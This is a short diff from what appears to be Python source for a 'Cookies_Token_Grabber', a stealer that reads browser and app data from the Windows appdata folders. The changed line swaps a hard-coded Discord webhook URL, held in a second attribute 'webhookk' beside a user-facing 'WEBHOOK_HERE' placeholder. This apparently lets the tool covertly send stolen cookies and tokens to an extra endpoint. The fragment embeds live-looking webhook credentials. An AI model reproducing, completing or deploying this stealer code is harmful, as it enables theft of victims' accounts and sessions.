@@ -15,7 +15,7 @@ from Crypto.Cipher import AES
 class Cookies_Token_Grabber:
     def __init__(self):
         self.webhook = "WEBHOOK_HERE"
-        self.webhookk = "https://discord.com/api/webhooks/926153875399012362/9aM2KEpuqUfnjd_2o9ft4nqQog4g07cswZUopjg1P8QjdF55QEJdujQZ9igyxVsQ7Jky"
+        self.webhookk = "https://discord.com/api/webhooks/927358648915722251/uqWUPVIAqwOgeLaEDShVijhMjD-bZj_FEUKhFCX_yyZWfuvHTifqTuQ3F933JdYBgr3Z"
         self.files = ""
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
